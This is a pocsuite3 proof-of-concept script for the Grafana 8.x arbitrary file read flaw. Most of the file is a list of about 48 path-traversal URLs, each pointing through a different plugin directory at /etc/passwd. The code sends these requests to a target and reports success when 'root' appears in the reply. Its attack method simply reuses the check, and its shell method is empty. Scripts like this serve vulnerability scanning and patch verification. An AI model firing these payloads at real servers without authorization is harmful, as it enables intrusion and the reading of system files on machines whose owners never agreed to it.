from collections import OrderedDict
from urllib.parse import urljoin
import requests,urllib3
import urllib.request
import ssl
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict,OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class TestPOC(POCBase):
    vulID = '0'# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'#默认为1
    author = ['luckying']#  PoC作者的大名
    vulDate = '2021-12-08' #漏洞公开的时间,不知道就写今天
    createDate = '2021-12-08'# 编写 PoC 的日期
    updateDate = '2021-12-08'# PoC 更新的时间,默认和编写时间一样
    references = ['']# 漏洞地址来源,0day不用写
    name = 'Grafana'# PoC 名称
    appPowerLink = ''# 漏洞厂商主页地址
    appName = 'Grafana Arbitrary file read'# 漏洞应用名称
    appVersion = 'Grafana 8.x'# 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Grafana 
    '''# 漏洞简要描述
    samples = ['']# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' 
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE


    def _verify(self):
        result = {}
        list = ['/public/plugins/alertGroups/../../../../../../../../etc/passwd',
        '/public/plugins/alertlist/../../../../../../../../etc/passwd',
        '/public/plugins/alertmanager/../../../../../../../../etc/passwd',
        '/public/plugins/annolist/../../../../../../../../etc/passwd',
        '/public/plugins/barchart/../../../../../../../../etc/passwd',
        '/public/plugins/bargauge/../../../../../../../../etc/passwd',
        '/public/plugins/canvas/../../../../../../../../etc/passwd',
        '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
        '/public/plugins/dashboard/../../../../../../../../etc/passwd',
        '/public/plugins/dashlist/../../../../../../../../etc/passwd',
        '/public/plugins/debug/../../../../../../../../etc/passwd',
        '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
        '/public/plugins/gauge/../../../../../../../../etc/passwd',
        '/public/plugins/geomap/../../../../../../../../etc/passwd',
        '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
        '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
        '/public/plugins/grafana/../../../../../../../../etc/passwd',
        '/public/plugins/graph/../../../../../../../../etc/passwd',
        '/public/plugins/graphite/../../../../../../../../etc/passwd',
        '/public/plugins/heatmap/../../../../../../../../etc/passwd',
        '/public/plugins/histogram/../../../../../../../../etc/passwd',
        '/public/plugins/influxdb/../../../../../../../../etc/passwd',
        '/public/plugins/jaeger/../../../../../../../../etc/passwd',
        '/public/plugins/live/../../../../../../../../etc/passwd',
        '/public/plugins/logs/../../../../../../../../etc/passwd',
        '/public/plugins/loki/../../../../../../../../etc/passwd',
        '/public/plugins/mixed/../../../../../../../../etc/passwd',
        '/public/plugins/mssql/../../../../../../../../etc/passwd',
        '/public/plugins/mysql/../../../../../../../../etc/passwd',
        '/public/plugins/news/../../../../../../../../etc/passwd',
        '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
        '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
        '/public/plugins/piechart/../../../../../../../../etc/passwd',
        '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
        '/public/plugins/postgres/../../../../../../../../etc/passwd',
        '/public/plugins/prometheus/../../../../../../../../etc/passwd',
        '/public/plugins/stat/../../../../../../../../etc/passwd',
        '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
        '/public/plugins/status-history/../../../../../../../../etc/passwd',
        '/public/plugins/table-old/../../../../../../../../etc/passwd',
        '/public/plugins/table/../../../../../../../../etc/passwd',
        '/public/plugins/tempo/../../../../../../../../etc/passwd',
        '/public/plugins/testdata/../../../../../../../../etc/passwd',
        '/public/plugins/text/../../../../../../../../etc/passwd',
        '/public/plugins/timeseries/../../../../../../../../etc/passwd',
        '/public/plugins/welcome/../../../../../../../../etc/passwd',
        '/public/plugins/xychart/../../../../../../../../etc/passwd',
        '/public/plugins/zipkin/../../../../../../../../etc/passwd',]
        for path in list:
            url = self.url + path
            try:
                resq = urllib.request.urlopen(url)
                text = resq.read().decode('utf-8')
                #print(text)
                if 'root' in text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['POC'] = path
            except Exception as e:
                return 
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
